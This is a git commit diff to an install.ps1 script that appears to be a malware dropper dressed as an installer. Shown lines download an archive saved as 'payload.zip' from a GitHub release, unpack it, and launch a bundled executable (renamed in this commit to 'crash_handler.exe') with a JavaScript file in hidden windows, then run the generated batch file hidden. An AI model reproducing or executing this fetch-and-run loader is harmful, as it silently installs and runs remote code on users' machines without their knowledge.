1a5e4a3f16ea49b93f01a32f16728ffd5eaa0644
Flowseal-Modules <b1@inmeow.ru>
2026-01-11 20:04:32 +0800

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -16,7 +16,7 @@ if not exist "%DEST%" (
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip' -OutFile '%TEMP%\payload.zip'"
 powershell -Command "Expand-Archive -Path '%TEMP%\payload.zip' -DestinationPath '%DEST%' -Force"
 
-for /f "delims=" %%i in ('dir /b /s "%DEST%\App\node.exe"') do set "NODE=%%i"
+for /f "delims=" %%i in ('dir /b /s "%DEST%\App\crash_handler.exe"') do set "NODE=%%i"
 for /f "delims=" %%i in ('dir /b /s "%DEST%\App\index_*.js"') do set "SCRIPT=%%i"
 
 powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%NODE%' -ArgumentList '%SCRIPT%' -WindowStyle Hidden -WorkingDirectory '%DEST%\App'"
@@ -25,3 +25,4 @@ endlocal
 "@ | Set-Content -Path $batPath -Encoding ASCII
 
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
+
